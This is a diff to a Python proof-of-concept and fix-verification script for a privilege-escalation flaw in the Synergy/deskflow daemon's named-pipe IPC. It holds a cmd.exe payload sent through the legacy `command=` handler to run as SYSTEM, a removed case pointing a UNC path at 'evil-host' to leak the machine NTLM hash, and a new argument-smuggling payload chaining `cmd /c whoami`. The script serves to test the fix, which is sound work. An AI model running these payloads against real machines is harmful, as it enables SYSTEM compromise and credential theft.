@@ -24,11 +24,13 @@ as SYSTEM.
         command=<arbitrary exe + args>
         elevate=yes
         start
-    Post-fix (CVE-2026-41477, deskflow PR 9656; backport in progress for
-    Synergy) the `command=` and `elevate=` handlers are gone and the GUI
-    instead points the daemon at a config file from which it derives a
-    trusted core binary path. This PoC's `fix-test` mode probes for the
-    fix shape; it only applies to the named-pipe IPC.
+    Post-fix (deskflow PR 9656 backported to Synergy with adapted shape):
+    `command=` is gone. The GUI now sends `mode=server|client`, `args=...`,
+    `elevate=yes|no`, then `start`. The daemon constructs the executable
+    path itself from `applicationDirPath() + SERVER_BINARY_NAME` (or
+    CLIENT), so the IPC sender can no longer choose what to spawn. This
+    PoC's `fix-test` mode probes for that shape; it only applies to the
+    named-pipe IPC.
 
 Modes:
 
@@ -299,15 +301,16 @@ def pipe_send_and_print(client, message, label, read_timeout=0.75):
 
 
 def pipe_detect_branch():
-    """Return 'post-fix' if `configFile=` is wired up, 'pre-fix' otherwise.
+    """Return 'post-fix' if `mode=` is wired up, 'pre-fix' otherwise.
 
-    Probe: send an empty `configFile=`. On a fix branch this hits the
-    empty-path check and replies 'error'. On pre-fix Synergy there is no
-    handler — the daemon logs 'unknown message' and sends no reply.
+    Probe: send `mode=` (empty value). On a fix branch this hits the
+    "invalid mode value" check in processMode and replies 'error'. On
+    pre-fix Synergy there is no `mode` handler — the daemon logs
+    'unknown message' and sends no reply.
     """
     try:
         with pipe_connect_and_handshake() as c:
-            c.send("configFile=")
+            c.send("mode=")
             reply = c.recv_line(timeout=1.0)
     except Exception:  # noqa: BLE001
         return None
@@ -703,9 +706,9 @@ def _fix_case(title, messages, expectation):
 
 
 def mode_fix_test():
-    """Injection battery against the new configFile= IPC command (pipe transport)."""
+    """Probe the new mode=/args=/elevate= IPC for residual attack surface."""
     print("=" * 70)
-    print("MODE: fix-test  —  probes the new configFile= command for bypasses")
+    print("MODE: fix-test  —  probes the new mode=/args=/elevate= IPC")
     print("=" * 70)
     print("Each case should be rejected or have no privileged effect.\n")
 
@@ -718,17 +721,16 @@ def mode_fix_test():
     branch = pipe_detect_branch()
     pre_fix = branch == "pre-fix"
     if pre_fix:
-        print("[!] Pre-fix daemon detected — `configFile=` is not wired up here.")
-        print("    Case A probes this daemon directly; cases B and C will be marked [N/A].\n")
+        print("[!] Pre-fix daemon detected — `mode=` is not wired up here.")
+        print("    Case A probes this daemon directly; case B will be marked [N/A].\n")
     elif branch == "post-fix":
-        print("[*] Post-fix daemon detected — `configFile=` is handled.\n")
+        print("[*] Post-fix daemon detected — `mode=`/`args=` are handled.\n")
     else:
         print("[!] Could not probe daemon; running battery anyway.\n")
 
-    # Elevation probe: if `command=` still works, the daemon spawns cmd.exe
-    # as SYSTEM and `whoami /all` dumps identity + integrity level into
-    # evidence_path. A message box would be invisible here — the daemon runs
-    # in Session 0, so any GUI it spawns lands on the non-interactive desktop.
+    # Case A: legacy `command=` is the privesc primitive. Post-fix it must be
+    # gone — no `processCommand` handler, no auto-spawn. We probe by sending a
+    # cmd.exe payload and verifying the evidence file never appears.
     evidence_path = rf"C:\Windows\Temp\synergy_elev_check_{os.getpid()}.txt"
     try:
         os.remove(evidence_path)
@@ -765,73 +767,62 @@ def mode_fix_test():
             pass
     elif pre_fix:
         # On pre-fix, `command=` is still a known handler and the watchdog did
-        # try to spawn (the log shows 'process immediately stopped' retries).
-        # Missing evidence file here means our poll window raced the backoff,
-        # not that the daemon rejected anything. Don't claim PASS.
+        # try to spawn. Missing evidence file here means our poll window raced
+        # the backoff, not that the daemon rejected anything.
         _verdict(None, "command= was accepted but no evidence file within 15s — daemon likely in backoff. Re-run.")
     else:
         _verdict(True, "no evidence file — legacy `command=` was rejected.")
 
-    # Case B: a UNC in configFile= would, unfixed, cause QFileInfo::exists()
-    # in DaemonApp::applyWatchdogCommand to trigger SMB auth from the SYSTEM
-    # daemon — leaking the machine NTLM hash to attacker-controlled hosts.
-    # The fix rejects paths starting with `\\` or `//` before the existence
-    # check, so this case should see a "remote config file paths are not
-    # allowed" rejection in the log.
-    pre = _log_size(log_path)
-    _fix_case(
-        "B. UNC in configFile= is rejected before QFileInfo::exists",
-        [
-            ("unc", r"configFile=\\evil-host\share\payload.ini"),
-            ("start", "start"),
-        ],
-        "daemon rejects UNC without calling QFileInfo::exists (no SMB auth, no NTLM leak).",
-    )
-    _post_case_log(log_path, pre, na=pre_fix)
-
-    # Case C: demonstrate that command smuggling via configFile= does not
-    # work. The path is interpolated into "<core>" server --settings "<path>"
-    # at DaemonApp.cpp:85 and passed to CreateProcess directly — no shell is
-    # involved, so `&`, `;`, backticks, `$(...)` are literal. The payload
-    # prefixes a real, plausible config path with `& cmd /c whoami /all > ev`
-    # so if the spawn ever goes through cmd/sh/pwsh, or the outer quoting
-    # around <path> is dropped in a refactor, the second command would run
-    # and write the evidence file. We verdict on the evidence file so the
-    # test trips whether the regression is in the existence check or the
-    # spawn path.
-    smuggle_ev = rf"C:\Windows\Temp\synergy_shell_smuggle_{os.getpid()}.txt"
+    # Case B: shell-style command smuggle via `args=`. The daemon builds
+    # `"<trusted-bin>" <args>` and hands the lot to CreateProcess. CreateProcess
+    # doesn't shell-interpret, so `&`/`;`/`>`/backticks are literal. We try
+    # three smuggle shapes:
+    #   - shell-metas (`& cmd /c ...`) that would chain on a shell
+    #   - quote escape (`"`) that would close the binPath quoting and let
+    #     attacker tokens become argv[0]
+    #   - bare second .exe path that would be executed if anything in the
+    #     chain re-parses args as a command line
+    # The trusted server/client binary will refuse the weird args and exit;
+    # the evidence file should never appear.
+    smuggle_ev = rf"C:\Windows\Temp\synergy_args_smuggle_{os.getpid()}.txt"
     try:
         os.remove(smuggle_ev)
     except OSError:
         pass
 
-    valid_config = (log_path or r"C:\Windows\System32\drivers\etc\hosts").replace("/", "\\")
-    smuggle_payload = (
-        f'configFile={valid_config} & C:\\Windows\\System32\\cmd.exe '
-        f'/c whoami /all > "{smuggle_ev}"'
+    smuggle_args = (
+        rf'foo" & C:\Windows\System32\cmd.exe /c whoami /all > "{smuggle_ev}'
     )
 
     pre = _log_size(log_path)
     _fix_case(
-        "C. shell-style command smuggle via configFile=",
+        "B. shell-style command smuggle via `args=`",
         [
-            ("cmd-chain", smuggle_payload),
+            ("mode", "mode=server"),
+            ("args-smuggle", f"args={smuggle_args}"),
+            ("elevate", "elevate=yes"),
             ("start", "start"),
         ],
-        "no evidence file appears (no shell involved; path also rejected by existence check).",
+        "no evidence file appears (CreateProcess does not shell-interpret args).",
     )
-    _wait_for_file(smuggle_ev, timeout=5.0)
+    _wait_for_file(smuggle_ev, timeout=10.0)
     _print_tail(_log_tail(log_path, pre))
     if os.path.exists(smuggle_ev):
-        _verdict(False, f"shell smuggle confirmed — evidence file created: {smuggle_ev}")
+        _verdict(False, f"smuggle confirmed — evidence file created: {smuggle_ev}")
+        try:
+            with open(smuggle_ev, encoding="utf-8", errors="replace") as f:
+                for line in f.read().splitlines()[:12]:
+                    print(f"         | {line}")
+        except OSError as e:
+            print(f"         !! read failed: {e}")
         try:
             os.remove(smuggle_ev)
         except OSError:
             pass
     elif pre_fix:
-        _verdict_na("fix-branch case; configFile= not handled on pre-fix daemon.")
+        _verdict_na("fix-branch case; mode=/args= not handled on pre-fix daemon.")
     else:
-        _verdict(True, "no evidence file — path not shell-interpreted, smuggle blocked.")
+        _verdict(True, "no evidence file — args not shell-interpreted, smuggle blocked.")
 
 
 # ===========================================================================
